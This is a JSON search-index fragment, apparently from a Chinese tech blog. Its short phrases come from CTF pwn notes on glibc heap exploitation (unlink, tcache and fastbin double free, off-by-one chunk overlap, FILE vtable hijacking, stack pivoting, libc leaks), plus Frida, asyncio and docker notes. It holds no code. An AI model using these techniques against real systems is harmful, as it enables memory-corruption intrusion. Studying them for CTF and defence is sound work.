1}}],[\"最终跑了一晚上才跑出来\",{\"1\":{\"165\":1,\"287\":1}}],[\"最终让fd和bk写上了main\",{\"1\":{\"145\":1}}],[\"最难崩的一步\",{\"1\":{\"165\":1,\"287\":1}}],[\"最消耗时间的一步\",{\"1\":{\"159\":1,\"281\":1}}],[\"最简单的一步\",{\"1\":{\"158\":1,\"280\":1}}],[\"最简单的结构\",{\"1\":{\"114\":1}}],[\"最后成功\",{\"1\":{\"256\":1}}],[\"最后就是检查input是否为flag了\",{\"1\":{\"245\":1}}],[\"最后就是执行入链操作了\",{\"1\":{\"104\":1}}],[\"最后我们直接在程序源代码重找cmp的部分找到了\",{\"1\":{\"255\":1}}],[\"最后我们jmp过去\",{\"1\":{\"234\":1}}],[\"最后我们free\",{\"1\":{\"87\":1}}],[\"最后只需要\",{\"1\":{\"153\":1}}],[\"最后的malloc变为malloc一个更小的chunk\",{\"1\":{\"144\":1}}],[\"最后被赋值victim\",{\"1\":{\"110\":1}}],[\"最小chunk为0x20\",{\"1\":{\"74\":1}}],[\"让它绕过安全检测\",{\"1\":{\"276\":1}}],[\"让它的size\",{\"1\":{\"148\":1}}],[\"让chunk进入fastbin链中\",{\"1\":{\"161\":1,\"283\":1}}],[\"让chunk进入unsortedbin中\",{\"1\":{\"157\":1,\"279\":1}}],[\"让原本的信息头chunk成为我们的内容chunk\",{\"1\":{\"157\":1,\"279\":1}}],[\"让fastbin链中第二个chunk\",{\"1\":{\"275\":1}}],[\"让fastbin进入unsortedbin中\",{\"1\":{\"157\":1,\"279\":1}}],[\"让fd和bk填充进去\",{\"1\":{\"142\":1}}],[\"让我们没办法直接覆盖fd\",{\"1\":{\"164\":1,\"286\":1}}],[\"让我们自己构造的size刚好覆盖在原chunk3\",{\"1\":{\"150\":1}}],[\"让我们可以分割\",{\"1\":{\"150\":1,\"154\":1}}],[\"让两个chunk\",{\"1\":{\"150\":1}}],[\"让tcache\",{\"1\":{\"143\":2}}],[\"让bck等于fwd\",{\"1\":{\"104\":1}}],[\"让0溢出到\",{\"1\":{\"87\":1}}],[\"让第八个gundam出现在unsorted\",{\"1\":{\"72\":1}}],[\"第7章\",{\"1\":{\"222\":1}}],[\"第5章\",{\"1\":{\"221\":1}}],[\"第二次输入\",{\"1\":{\"290\":1}}],[\"第二次构造\",{\"1\":{\"290\":1}}],[\"第二次直接劫持程序流程one\",{\"1\":{\"266\":1}}],[\"第二次double\",{\"1\":{\"260\":1}}],[\"第二次负责修改\",{\"1\":{\"157\":1,\"279\":1}}],[\"第二个参数\",{\"1\":{\"234\":1}}],[\"第二部分\",{\"1\":{\"211\":1}}],[\"第二题apples\",{\"1\":{\"84\":1}}],[\"第一次泄露libc\",{\"1\":{\"266\":1}}],[\"第一次泄露tls中的key\",{\"1\":{\"157\":1,\"279\":1}}],[\"第一次构造\",{\"1\":{\"264\":1}}],[\"第一次拿到这个附件\",{\"1\":{\"248\":1}}],[\"第一个参数\",{\"1\":{\"234\":1}}],[\"第一个chunk\",{\"1\":{\"106\":1}}],[\"第一部分\",{\"1\":{\"211\":1}}],[\"第10个chunk\",{\"1\":{\"87\":1}}],[\"第10个chunk上\",{\"1\":{\"87\":1}}],[\"第9chunk\",{\"1\":{\"87\":1}}],[\"第十一个防止合并\",{\"1\":{\"87\":1}}],[\"先是取回所有的tcache\",{\"1\":{\"276\":1}}],[\"先是get我们的输入\",{\"1\":{\"245\":1}}],[\"先开始想复杂了\",{\"1\":{\"268\":1}}],[\"先大概把类型改改\",{\"1\":{\"244\":1}}],[\"先创建一个file结构体\",{\"1\":{\"186\":1}}],[\"先调用arena\",{\"1\":{\"135\":1}}],[\"先获取我们真正需要的\",{\"1\":{\"121\":1}}],[\"先malloc\",{\"1\":{\"87\":1,\"143\":1}}],[\"先学习unlink漏洞\",{\"0\":{\"80\":1}}],[\"错误思路\",{\"0\":{\"87\":1}}],[\"错了别打我\",{\"1\":{\"23\":1}}],[\"连续申请大量chunk\",{\"1\":{\"161\":1,\"283\":1}}],[\"连leak\",{\"1\":{\"84\":1}}],[\"连pip都下载不起\",{\"1\":{\"47\":1}}],[\"昨天做vctf被打自闭了\",{\"1\":{\"84\":1}}],[\"​\",{\"1\":{\"83\":1,\"141\":1,\"150\":1,\"231\":1}}],[\"调整attached\",{\"1\":{\"138\":1}}],[\"调试源码\",{\"0\":{\"189\":1}}],[\"调试\",{\"0\":{\"96\":1,\"193\":1,\"196\":1,\"199\":1,\"202\":1,\"205\":1,\"225\":1}}],[\"调试技巧\",{\"0\":{\"82\":1}}],[\"调用read在bss段部署payload\",{\"1\":{\"290\":1}}],[\"调用open函数\",{\"1\":{\"268\":1}}],[\"调用overflow\",{\"1\":{\"172\":1}}],[\"调用号\",{\"1\":{\"268\":1}}],[\"调用scanf后\",{\"1\":{\"216\":1}}],[\"调用\",{\"0\":{\"172\":1},\"1\":{\"172\":1,\"234\":1}}],[\"调用主要是\",{\"1\":{\"136\":1}}],[\"调用链\",{\"0\":{\"135\":1}}],[\"调用了的函数\",{\"1\":{\"30\":1}}],[\"调用构造函数\",{\"1\":{\"20\":1}}],[\"调用原函数\",{\"1\":{\"20\":1}}],[\"调用原本的函数\",{\"0\":{\"18\":1}}],[\"调用原来的函数\",{\"1\":{\"17\":1,\"19\":1}}],[\"ⅱ\",{\"1\":{\"81\":1}}],[\"ⅰ\",{\"1\":{\"81\":1}}],[\"脱链\",{\"1\":{\"81\":1}}],[\"将十六进制数字转换为字符串\",{\"1\":{\"288\":1}}],[\"将内容赋值过去\",{\"1\":{\"268\":1}}],[\"将控制权移交给ld\",{\"1\":{\"239\":1}}],[\"将返回地址移动到\",{\"1\":{\"234\":1}}],[\"将reloc\",{\"1\":{\"234\":1}}],[\"将rip寄存器改值\",{\"1\":{\"231\":1}}],[\"将rbp寄存器改值\",{\"1\":{\"231\":1}}],[\"将file链接到\",{\"1\":{\"188\":1}}],[\"将fd指向exit\",{\"1\":{\"165\":1,\"287\":1}}],[\"将fd和bk包含在这个大chunk中\",{\"1\":{\"87\":1}}],[\"将topchunk消耗空触发合并\",{\"1\":{\"165\":1,\"287\":1}}],[\"将\",{\"1\":{\"150\":1,\"154\":1,\"188\":1}}],[\"将新的分配区加入到全局链表上\",{\"1\":{\"138\":1}}],[\"将当前线程设置mstate\",{\"1\":{\"138\":1}}],[\"将合并后的chunk\",{\"1\":{\"109\":1}}],[\"将块\",{\"1\":{\"109\":1}}],[\"将p\",{\"1\":{\"81\":2}}],[\"将其他开发者\",{\"1\":{\"6\":1}}],[\"检查size是否对得上\",{\"1\":{\"147\":1}}],[\"检查double\",{\"1\":{\"124\":1}}],[\"检查unsortedbin是否合法\",{\"1\":{\"109\":1}}],[\"检查是否等于头一个chunk\",{\"1\":{\"109\":1}}],[\"检查fastbin的头部chunk是否为当前free的chunk\",{\"1\":{\"109\":1}}],[\"检查第一个chunk的bk是否为unsorted\",{\"1\":{\"106\":1}}],[\"检查当前chunk是否是free的\",{\"1\":{\"97\":1}}],[\"检查bck的fd是否为当前chunk\",{\"1\":{\"97\":1}}],[\"检查next\",{\"1\":{\"97\":1}}],[\"检查\",{\"1\":{\"81\":1}}],[\"检查下一个chunk的prev\",{\"1\":{\"81\":1}}],[\"流程知道了\",{\"1\":{\"247\":1}}],[\"流程时\",{\"1\":{\"208\":1}}],[\"流程\",{\"0\":{\"81\":1,\"113\":1,\"134\":1,\"245\":1}}],[\"待脱链的空闲chunk的指针\",{\"1\":{\"80\":1}}],[\"宏定义\",{\"1\":{\"80\":1}}],[\"明确一下对象双向链表\",{\"1\":{\"80\":1}}],[\"腾讯云\",{\"1\":{\"80\":1}}],[\"腾讯云开发者社区\",{\"1\":{\"80\":1}}],[\"构造成功两个fastbin的情况\",{\"1\":{\"276\":1}}],[\"构造两个fastbin的情况\",{\"1\":{\"276\":1}}],[\"构造到malloc\",{\"1\":{\"273\":1}}],[\"构造栈\",{\"1\":{\"268\":1}}],[\"构造double\",{\"1\":{\"260\":2,\"275\":1}}],[\"构造时将vatble填写\",{\"1\":{\"169\":1}}],[\"构造一个double\",{\"1\":{\"163\":1,\"285\":1}}],[\"构造一个chunkheader\",{\"1\":{\"148\":1}}],[\"构造合并chunk\",{\"0\":{\"153\":1}}],[\"构造bk\",{\"0\":{\"152\":1},\"1\":{\"154\":1}}],[\"构造fastbin\",{\"1\":{\"288\":1}}],[\"构造fakecchunk\",{\"0\":{\"162\":1,\"284\":1}}],[\"构造fake\",{\"1\":{\"143\":1,\"144\":1,\"154\":1}}],[\"构造fd\",{\"0\":{\"151\":1},\"1\":{\"154\":1}}],[\"构造chunk\",{\"0\":{\"150\":1}}],[\"构造的chunk\",{\"1\":{\"143\":1,\"144\":1}}],[\"构造heap\",{\"1\":{\"79\":1}}],[\"构建指定版本libc的docker\",{\"0\":{\"41\":1}}],[\"马上free了\",{\"1\":{\"78\":1}}],[\"存储\",{\"1\":{\"236\":1}}],[\"存储的是指针\",{\"1\":{\"184\":1}}],[\"存入fake\",{\"1\":{\"231\":1}}],[\"存在栈的off\",{\"1\":{\"265\":1}}],[\"存在泄露\",{\"1\":{\"156\":1,\"278\":1}}],[\"存在于tls\",{\"1\":{\"123\":1}}],[\"存在off\",{\"1\":{\"86\":1}}],[\"存一个int\",{\"1\":{\"77\":1}}],[\"存一个结构体指针\",{\"1\":{\"77\":1}}],[\"存name\",{\"1\":{\"77\":1}}],[\"存content\",{\"1\":{\"77\":1}}],[\"存\",{\"1\":{\"77\":1}}],[\"存size\",{\"1\":{\"77\":1}}],[\"存使用情况\",{\"1\":{\"77\":2}}],[\"查找关键结构体\",{\"1\":{\"77\":1}}],[\"查看相关引用\",{\"1\":{\"245\":1}}],[\"查看程序当前信息\",{\"0\":{\"240\":1}}],[\"查看offset是否在这个区间范围之内\",{\"1\":{\"213\":1}}],[\"查看\",{\"1\":{\"202\":1}}],[\"查看list\",{\"1\":{\"202\":1}}],[\"查看一下偏移\",{\"1\":{\"175\":1}}],[\"查看glibc的源码网址\",{\"1\":{\"116\":1}}],[\"查看下一个chunk是否大于整个内存空间的边界\",{\"1\":{\"109\":1}}],[\"查看unsortedbin的大小\",{\"1\":{\"96\":1}}],[\"查看future是否有值\",{\"1\":{\"65\":1}}],[\"查看future是否已经被取消了\",{\"1\":{\"65\":1}}],[\"查看正在执行的容器\",{\"1\":{\"43\":1}}],[\"查看镜像\",{\"1\":{\"43\":1}}],[\"查看目前top顶部的activity\",{\"1\":{\"30\":1}}],[\"脚本\",{\"0\":{\"75\":1,\"154\":1,\"247\":1,\"260\":1,\"264\":1,\"276\":1}}],[\"内存映射将文件加载到内存中\",{\"1\":{\"239\":1}}],[\"内存单次申请的峰值\",{\"1\":{\"223\":1}}],[\"内存中提前分配了30相同大小的内存slot\",{\"1\":{\"223\":1}}],[\"内存管理\",{\"1\":{\"221\":1}}],[\"内存不可写\",{\"1\":{\"163\":1,\"285\":1}}],[\"内存对齐\",{\"1\":{\"74\":1}}],[\"内容被阶段了\",{\"1\":{\"145\":1}}],[\"内部传给本地\",{\"1\":{\"43\":1}}],[\"无法根据malloc\",{\"1\":{\"73\":1}}],[\"无名图书\",{\"1\":{\"9\":1}}],[\"计算出key加密后的地址\",{\"1\":{\"165\":1,\"287\":1}}],[\"计算\",{\"1\":{\"72\":1,\"95\":1,\"97\":1}}],[\"同步访问互斥锁\",{\"1\":{\"132\":1}}],[\"同步方式\",{\"1\":{\"22\":1}}],[\"同理设计为ptr\",{\"1\":{\"130\":1}}],[\"同一个大小的chunk通过fd\",{\"1\":{\"93\":1}}],[\"同一个地址\",{\"1\":{\"72\":1}}],[\"另一个为0x110\",{\"1\":{\"72\":1}}],[\"那么\",{\"1\":{\"231\":1}}],[\"那么同理\",{\"1\":{\"231\":1}}],[\"那么下面是实现原理图\",{\"1\":{\"231\":1}}],[\"那么这个指令的本质\",{\"1\":{\"231\":1}}],[\"那么最终就会在目标地址0x0到0x30处覆盖上我们的0xf0偏移处的数据\",{\"1\":{\"173\":1}}],[\"那么就是libc\",{\"1\":{\"241\":1}}],[\"那么就是我们构造的file结构体\",{\"1\":{\"173\":1}}],[\"那么就很明确了\",{\"1\":{\"81\":1}}],[\"那么后面我们就要想办法让chunk\",{\"1\":{\"150\":1}}],[\"那么fd\",{\"1\":{\"130\":1}}],[\"那么我们字符串后面填上getshell的shellcode即可\",{\"1\":{\"267\":1}}],[\"那么我们就知道了\",{\"1\":{\"255\":1}}],[\"那么我们就去free掉chunk\",{\"1\":{\"153\":1}}],[\"那么我们的rsp也成功完成了迁移工作\",{\"1\":{\"231\":1}}],[\"那么我们如果可以劫持这两个\",{\"1\":{\"216\":1}}],[\"那么我们如何找到它呢\",{\"1\":{\"72\":1}}],[\"那么我们malloc三次获取我们想要的地址的读写权\",{\"1\":{\"124\":1}}],[\"那么链表\",{\"1\":{\"124\":1}}],[\"那么输入指令后我们找到了这个chunk\",{\"1\":{\"72\":1}}],[\"那么第八个的地址\",{\"1\":{\"72\":1}}],[\"那么问题来了我们的首先启动的activity究竟是什么\",{\"1\":{\"38\":1}}],[\"指令的地址\",{\"1\":{\"234\":1}}],[\"指令\",{\"1\":{\"231\":1}}],[\"指令来查看对应地址\",{\"1\":{\"72\":1}}],[\"指针\",{\"1\":{\"186\":1}}],[\"指针常量本质是常量\",{\"1\":{\"184\":1}}],[\"指针为char类型\",{\"1\":{\"77\":1}}],[\"指定free\",{\"1\":{\"165\":1,\"287\":1}}],[\"指定版本\",{\"1\":{\"41\":1}}],[\"指向一个指针的指针\",{\"1\":{\"243\":1}}],[\"指向将被传递给\",{\"1\":{\"243\":1}}],[\"指向将由新线程执行的函数的函数指针\",{\"1\":{\"243\":1}}],[\"指向\",{\"1\":{\"243\":2}}],[\"指向上一个chunk\",{\"1\":{\"223\":1}}],[\"指向下一个free\",{\"1\":{\"226\":1}}],[\"指向下一个chunk\",{\"1\":{\"223\":1}}],[\"指向下一个可用的位置\",{\"1\":{\"211\":1}}],[\"指向heap\",{\"1\":{\"223\":1}}],[\"指向chunk链表头部\",{\"1\":{\"223\":1}}],[\"指向chunk3\",{\"1\":{\"151\":1}}],[\"指向的是一个类型为\",{\"1\":{\"186\":1}}],[\"指向的是否是p\",{\"1\":{\"81\":1}}],[\"指向我们想要malloc的地址\",{\"1\":{\"260\":1}}],[\"指向我们的fake\",{\"1\":{\"151\":1}}],[\"指向我们伪造的chunk\",{\"1\":{\"150\":1}}],[\"指向我们我们stack里面的空间\",{\"1\":{\"91\":1}}],[\"用来表示\",{\"1\":{\"236\":1}}],[\"用来在分配的时候加速\",{\"1\":{\"132\":1}}],[\"用于合并\",{\"1\":{\"273\":1}}],[\"用于覆写\",{\"1\":{\"273\":1}}],[\"用于定义字段边界\",{\"1\":{\"251\":1}}],[\"用于在文件中加上行号\",{\"1\":{\"249\":1}}],[\"用于查看文件的后几行内容\",{\"1\":{\"249\":1}}],[\"用于查看文件的前几行内容\",{\"1\":{\"249\":1}}],[\"用于分页查看文件内容\",{\"1\":{\"249\":1}}],[\"用于将文件内容输出到终端上\",{\"1\":{\"249\":1}}],[\"用于接收被等待线程的退出状态\",{\"1\":{\"243\":1}}],[\"用于等待指定的线程结束\",{\"1\":{\"243\":1}}],[\"用于说明目的\",{\"1\":{\"234\":1}}],[\"用于large分配还是small\",{\"1\":{\"223\":1}}],[\"用于管理small\",{\"1\":{\"223\":1}}],[\"用于指向各种处理函数\",{\"1\":{\"186\":1}}],[\"用于记录堆的信息\",{\"1\":{\"138\":1}}],[\"用于标记是否有fastchunk\",{\"1\":{\"132\":1}}],[\"用于标记当前主分配区的状态\",{\"1\":{\"132\":1}}],[\"用于检查\",{\"1\":{\"127\":1}}],[\"用于检查计算prev\",{\"1\":{\"88\":1}}],[\"用结构tcache\",{\"1\":{\"123\":1}}],[\"用户申请内存的时候\",{\"1\":{\"114\":1}}],[\"用户使用malloc函数向堆管理器申请一块内存空间\",{\"1\":{\"113\":1}}],[\"用x\",{\"1\":{\"72\":1}}],[\"用vmmap指令查找heap最开始的位置\",{\"1\":{\"72\":1}}],[\"用提取数组的方式依次hook这些重载函数\",{\"1\":{\"19\":1}}],[\"koko\",{\"1\":{\"180\":3}}],[\"keys\",{\"1\":{\"249\":1}}],[\"key\",{\"1\":{\"165\":2,\"287\":2,\"288\":5}}],[\"kept\",{\"1\":{\"132\":1}}],[\"keeping\",{\"1\":{\"71\":1}}],[\"know\",{\"1\":{\"109\":2,\"202\":1}}],[\"known\",{\"1\":{\"46\":2}}],[\"代码过于复杂\",{\"1\":{\"185\":1}}],[\"代码\",{\"1\":{\"71\":1,\"150\":1,\"151\":1,\"152\":1,\"153\":1}}],[\"代码风格的调整\",{\"1\":{\"50\":1}}],[\"机制\",{\"0\":{\"71\":1},\"1\":{\"71\":1}}],[\"当一个线程结束时\",{\"1\":{\"243\":1}}],[\"当前page使用类型\",{\"1\":{\"223\":1}}],[\"当前request使用chunk峰值\",{\"1\":{\"223\":1}}],[\"当前已用内存数\",{\"1\":{\"223\":1}}],[\"当前chunk的剩余page数\",{\"1\":{\"223\":1}}],[\"当前chunk的\",{\"1\":{\"104\":1}}],[\"当数据写入缓冲区的时候\",{\"1\":{\"211\":1}}],[\"当执行流从\",{\"1\":{\"208\":1}}],[\"当执行\",{\"1\":{\"208\":1}}],[\"当\",{\"1\":{\"208\":1}}],[\"当用户释放的内存大于max\",{\"1\":{\"132\":1}}],[\"当用户释放一块不大于max\",{\"1\":{\"132\":1}}],[\"当bins上都不能满足内存分配要求的时候\",{\"1\":{\"132\":1}}],[\"当检查一样时候\",{\"1\":{\"127\":1}}],[\"当对应的tcahe\",{\"1\":{\"70\":1}}],[\"当我们执行read函数的时候\",{\"1\":{\"231\":1}}],[\"当我们可以多写一个字节的时候我们可以构造一个fake\",{\"1\":{\"130\":1}}],[\"当我们申请0xn0和0xn8内存大小的时候\",{\"1\":{\"115\":1}}],[\"当我们需求的chunk\",{\"1\":{\"104\":1}}],[\"当我们在函数使用了yield关键字后\",{\"1\":{\"66\":1}}],[\"当我们获取到java类之后\",{\"1\":{\"17\":1}}],[\"大致原理都是相同的\",{\"1\":{\"288\":1}}],[\"大致就是构造一个情况\",{\"1\":{\"273\":1}}],[\"大致利用原理\",{\"0\":{\"157\":1,\"279\":1}}],[\"大内存链表\",{\"1\":{\"223\":1}}],[\"大于2mb小于4k\",{\"1\":{\"223\":1}}],[\"大于8个就行\",{\"1\":{\"143\":1}}],[\"大于max\",{\"1\":{\"69\":1}}],[\"大约有10个定长队列\",{\"1\":{\"132\":1}}],[\"大多数性质和fastbin是一样的\",{\"1\":{\"125\":1}}],[\"大概就是调用\",{\"1\":{\"234\":1}}],[\"大概就是这个样子\",{\"1\":{\"93\":1}}],[\"大概\",{\"1\":{\"185\":1}}],[\"大概率不对齐\",{\"1\":{\"165\":1,\"287\":1}}],[\"大概率会是内存不对齐\",{\"1\":{\"163\":1,\"285\":1}}],[\"大概思路\",{\"1\":{\"157\":1,\"279\":1}}],[\"大概思路就是\",{\"1\":{\"87\":1}}],[\"大概意思是去剩下的chunk中寻找\",{\"1\":{\"108\":1}}],[\"大概是docker代理的问题\",{\"1\":{\"46\":1}}],[\"大小0x110\",{\"1\":{\"153\":1}}],[\"大小\",{\"1\":{\"121\":1}}],[\"大小刚好相等情况\",{\"0\":{\"100\":1}}],[\"大小刚好大于所需nb大小+minsize\",{\"1\":{\"98\":1}}],[\"大小的\",{\"1\":{\"97\":1}}],[\"大小检查\",{\"1\":{\"81\":1}}],[\"大小为0x30\",{\"1\":{\"72\":1}}],[\"作为参数传入asyncio\",{\"1\":{\"67\":1}}],[\"只要写满了\",{\"1\":{\"265\":1}}],[\"只能向下翻页\",{\"1\":{\"249\":1}}],[\"只有主chunk会用到\",{\"1\":{\"223\":1}}],[\"只不过指针所指向的地址得是个常量\",{\"1\":{\"184\":1}}],[\"只不过需要绕过一下新版本中对vtable地址的检测\",{\"1\":{\"178\":1}}],[\"只不过我们还是得调整一下要选择合并的chunk的位置\",{\"1\":{\"153\":1}}],[\"只需要\",{\"1\":{\"143\":1,\"144\":1}}],[\"只需要把函数调用\",{\"1\":{\"67\":1}}],[\"只是为了学习\",{\"1\":{\"24\":1}}],[\"启动\",{\"1\":{\"67\":1}}],[\"启动并且附带脚本\",{\"1\":{\"14\":1}}],[\"后缀改为\",{\"1\":{\"248\":1}}],[\"后new\",{\"1\":{\"193\":1}}],[\"后续的malloc失效\",{\"1\":{\"163\":1,\"285\":1}}],[\"后面的参数就是栈地址了\",{\"1\":{\"261\":1}}],[\"后面的操作中最重要的就是victim变量\",{\"1\":{\"95\":1}}],[\"后面细讲\",{\"1\":{\"157\":1,\"279\":1}}],[\"后面会详细说明\",{\"1\":{\"150\":1}}],[\"后面详细说一下我们的利用流程\",{\"1\":{\"148\":1}}],[\"后一个chunk的指针\",{\"1\":{\"80\":1}}],[\"后args会变成yield的返回值\",{\"1\":{\"66\":1}}],[\"后台运行\",{\"1\":{\"43\":1}}],[\"生成器对象\",{\"1\":{\"66\":1}}],[\"此指针只有内存未分配时用到\",{\"1\":{\"223\":1}}],[\"此时chunk\",{\"1\":{\"276\":1}}],[\"此时fastbin有三个\",{\"1\":{\"276\":1}}],[\"此时index为6的获取了\",{\"1\":{\"276\":1}}],[\"此时index为5\",{\"1\":{\"162\":1,\"284\":1}}],[\"此时我们rsp\",{\"1\":{\"231\":1}}],[\"此时我们成功完成构造\",{\"1\":{\"153\":1}}],[\"此时函数并未真正在执行\",{\"1\":{\"66\":1}}],[\"此pr修复了什么\",{\"1\":{\"55\":1}}],[\"函数允许一个线程等待另一个线程结束\",{\"1\":{\"243\":1}}],[\"函数是\",{\"1\":{\"243\":1}}],[\"函数在成功时返回\",{\"1\":{\"243\":1}}],[\"函数的参数的指针\",{\"1\":{\"243\":1}}],[\"函数的伪声明\",{\"1\":{\"234\":1}}],[\"函数成功完成时\",{\"1\":{\"243\":1}}],[\"函数\",{\"1\":{\"243\":1}}],[\"函数返回时\",{\"1\":{\"208\":1}}],[\"函数时\",{\"1\":{\"208\":1}}],[\"函数尾部\",{\"1\":{\"188\":1}}],[\"函数就可以轻易完成对文件地操作\",{\"1\":{\"186\":1}}],[\"函数被调用\",{\"1\":{\"66\":1}}],[\"函数才会真正执行\",{\"1\":{\"66\":1}}],[\"函数执行\",{\"1\":{\"66\":1}}],[\"函数调用的时候就变成了生成器\",{\"1\":{\"66\":1}}],[\"函数地址=so地址+函数偏移\",{\"1\":{\"23\":1}}],[\"异常相关\",{\"1\":{\"65\":1}}],[\"异步方式\",{\"1\":{\"22\":1}}],[\"设置\",{\"1\":{\"202\":1}}],[\"设置为fake\",{\"1\":{\"182\":2}}],[\"设置为\",{\"1\":{\"182\":1}}],[\"设置为1\",{\"1\":{\"182\":1}}],[\"设置为null\",{\"1\":{\"106\":1}}],[\"设置一个size到原本size的地方\",{\"1\":{\"150\":1,\"154\":1}}],[\"设置一个future完成时候要触发的回调函数\",{\"1\":{\"65\":1}}],[\"设置进程关联个数\",{\"1\":{\"138\":1}}],[\"设置nextchunk\",{\"1\":{\"109\":1}}],[\"设置下一个chunk\",{\"1\":{\"106\":1}}],[\"设置异常\",{\"1\":{\"65\":1}}],[\"设置future的值\",{\"1\":{\"65\":1}}],[\"下能访问到20位的地址线\",{\"1\":{\"220\":1}}],[\"下面的解释其实有失偏颇\",{\"1\":{\"153\":1}}],[\"下面是其接口\",{\"1\":{\"65\":1}}],[\"下方是malloc一个新的分区的情况\",{\"1\":{\"134\":1}}],[\"下标1是unsorted\",{\"1\":{\"132\":1}}],[\"下一个free\",{\"1\":{\"123\":1}}],[\"下一个chunk也是free\",{\"1\":{\"109\":1}}],[\"下常规overlapping失败的原因\",{\"0\":{\"84\":1}}],[\"下载python\",{\"1\":{\"47\":1}}],[\"会显示\",{\"1\":{\"249\":2}}],[\"会从标准输入读取数据\",{\"1\":{\"249\":1}}],[\"会折行显示超出屏幕宽度的长行\",{\"1\":{\"249\":1}}],[\"会优先取\",{\"1\":{\"226\":1}}],[\"会将file结构体中的\",{\"1\":{\"169\":1}}],[\"会ptamlloc一个新的分配区\",{\"1\":{\"134\":1}}],[\"会检查线程中是否存在分配区\",{\"1\":{\"134\":1}}],[\"会默认会被放到fast\",{\"1\":{\"132\":1}}],[\"会使用unlink\",{\"1\":{\"129\":1}}],[\"会for循环迭代tcache查看是否有指针和这个即将free的chunk的指针一样\",{\"1\":{\"127\":1}}],[\"会在free进入tcache后在bk位置写入随机数\",{\"1\":{\"127\":1}}],[\"会先搜索bins\",{\"1\":{\"114\":1}}],[\"会返回一个生成器对象\",{\"1\":{\"66\":1}}],[\"会去循环以及准备好的堵塞事件\",{\"1\":{\"64\":1}}],[\"会根据不同的参数来打开不同的界面\",{\"1\":{\"39\":1}}],[\"并去掉开头的\",{\"1\":{\"288\":1}}],[\"并回收其资源\",{\"1\":{\"243\":1}}],[\"并将它们加载到内存中\",{\"1\":{\"239\":1}}],[\"并跳转到0x7c00位置\",{\"1\":{\"218\":1}}],[\"并不是所有的chunk都会被放到bins上\",{\"1\":{\"132\":1}}],[\"并发开启\",{\"1\":{\"245\":1}}],[\"并发\",{\"1\":{\"67\":1}}],[\"并对每个事件添加callback回调函数\",{\"1\":{\"64\":1}}],[\"并且多两个chunk\",{\"1\":{\"276\":1}}],[\"并且最重要的是在free的时候没有对chunk指针进行清空\",{\"1\":{\"274\":1}}],[\"并且发现下面这个函数\",{\"1\":{\"245\":1}}],[\"并且接受一个\",{\"1\":{\"243\":1}}],[\"并且映射进入内存\",{\"1\":{\"239\":1}}],[\"并且\",{\"1\":{\"234\":1}}],[\"并且还因为比赛方平台网络不是特别好\",{\"1\":{\"165\":1,\"287\":1}}],[\"并且还不能破坏到了canary的值\",{\"1\":{\"163\":1,\"285\":1}}],[\"并且free\",{\"1\":{\"161\":1,\"283\":1}}],[\"并且没有清空\",{\"1\":{\"156\":1,\"278\":1}}],[\"并且没有检测这个index是否在使用\",{\"1\":{\"156\":1,\"278\":1}}],[\"并且仅在创建的时候可以写入数据\",{\"1\":{\"156\":1,\"278\":1}}],[\"并且向原本chunk6\",{\"1\":{\"152\":1}}],[\"并且构造好0x550的prev\",{\"1\":{\"153\":1}}],[\"并且构造好prev\",{\"1\":{\"87\":1,\"153\":1}}],[\"并且构造size\",{\"1\":{\"150\":1}}],[\"并且我们的fd和bk在0x430+16字节的位置\",{\"1\":{\"150\":1,\"154\":1}}],[\"并且通过消耗空topchunk\",{\"1\":{\"157\":1,\"279\":1}}],[\"并且通过测试发现只要是刚好要malloc的chunk大小如何符合\",{\"1\":{\"143\":1}}],[\"并且通过上面的这个列表\",{\"1\":{\"132\":1}}],[\"并且设置了全局变量main\",{\"1\":{\"138\":1}}],[\"并且设置物理意义上紧挨着的下一个chunk的size中p为0也就是free状态\",{\"1\":{\"100\":1}}],[\"并且进行内存分配\",{\"1\":{\"134\":1}}],[\"并且进行安全检查\",{\"1\":{\"104\":1}}],[\"并且按照功能分了标题\",{\"1\":{\"92\":1}}],[\"并且被清空\",{\"1\":{\"78\":1}}],[\"并且当我调用send的时候\",{\"1\":{\"66\":1}}],[\"并且merge进入了master分支\",{\"1\":{\"60\":1}}],[\"并且分配一个交互终端\",{\"1\":{\"43\":1}}],[\"并且这个属性只能在android应用中有一个\",{\"1\":{\"39\":1}}],[\"基本使用\",{\"0\":{\"67\":1}}],[\"基本信息\",{\"1\":{\"37\":1}}],[\"基础对象\",{\"0\":{\"63\":1}}],[\"网络程序\",{\"1\":{\"62\":1}}],[\"来看看运行的顺序\",{\"1\":{\"246\":1}}],[\"来看看对应函数运行的时候n的值\",{\"1\":{\"246\":1}}],[\"来获取名字了\",{\"1\":{\"236\":1}}],[\"来解析符号地址\",{\"1\":{\"234\":1}}],[\"来到了\",{\"1\":{\"231\":1}}],[\"来绕过fastbin中检查double\",{\"1\":{\"163\":1,\"285\":1}}],[\"来让scanf\",{\"1\":{\"161\":1,\"283\":1}}],[\"来让原本的头chunk之间相互合并\",{\"1\":{\"159\":1,\"281\":1}}],[\"来触发合并\",{\"1\":{\"161\":1,\"283\":1}}],[\"来实现栈迁移返回到存放backdoor的栈地址上\",{\"1\":{\"265\":1}}],[\"来实现任意地址的free\",{\"1\":{\"157\":1,\"279\":1}}],[\"来实现一个fake\",{\"1\":{\"130\":1}}],[\"来申请0x90大小的chunk\",{\"1\":{\"157\":1,\"279\":1}}],[\"来构建高性能\",{\"1\":{\"62\":1}}],[\"来确定默认首先进入的activity\",{\"1\":{\"39\":1}}],[\"理解理解\",{\"1\":{\"89\":1}}],[\"理解\",{\"1\":{\"62\":1}}],[\"技术揭秘\",{\"1\":{\"62\":1}}],[\"实验float的存储数据\",{\"0\":{\"255\":1}}],[\"实际的\",{\"1\":{\"234\":1}}],[\"实际实现会根据系统的动态链接器的具体需求和优化而有所不同\",{\"1\":{\"234\":1}}],[\"实际通过zend\",{\"1\":{\"223\":1}}],[\"实现任意写操作\",{\"1\":{\"275\":1}}],[\"实现任意free\",{\"1\":{\"159\":1,\"281\":1}}],[\"实现会在这里\",{\"1\":{\"234\":1}}],[\"实现函数调用\",{\"1\":{\"234\":1}}],[\"实现在exit的时候任意函数的调用\",{\"1\":{\"157\":1,\"279\":1}}],[\"实现leak\",{\"1\":{\"146\":1}}],[\"实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应\",{\"1\":{\"163\":1,\"285\":1}}],[\"实践\",{\"0\":{\"61\":1,\"143\":1}}],[\"实战\",{\"0\":{\"25\":1}}],[\"写上我们想要覆盖的数据\",{\"1\":{\"173\":1}}],[\"写上\",{\"1\":{\"173\":1}}],[\"写入chunk的时候多写了一位0\",{\"1\":{\"272\":1}}],[\"写入one\",{\"1\":{\"261\":1}}],[\"写